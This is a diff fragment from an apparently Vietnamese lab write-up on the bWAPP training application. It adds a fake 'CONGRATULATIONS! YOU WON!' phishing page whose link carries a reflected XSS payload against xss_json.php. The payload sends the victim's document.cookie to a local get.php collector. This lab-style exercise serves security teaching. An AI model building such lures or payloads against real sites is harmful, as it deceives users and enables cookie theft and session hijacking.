@@ -33,3 +33,14 @@ Dùng file get.php như case XSS get mức Low
 Source phishing:
 
 ``` html
+<html>
+<head>
+<title>Lottery hihi</title>
+</head>
+<body>
+	<h1 align="center">CONGRATULATIONS!!!</h1>
+	<h1 align="center">YOU WON!!!</h1>
+	Click this <a href="http://localhost/bwapp/xss_json.php?title=}]}';window.open%28%22http%3A%2F%2Flocalhost%2Fget.php%3Fcookie%3D%22%2Bdocument.cookie%29<%2Fscript>&action=search">link</a> to see your prize
+</body>
+</html>
+```
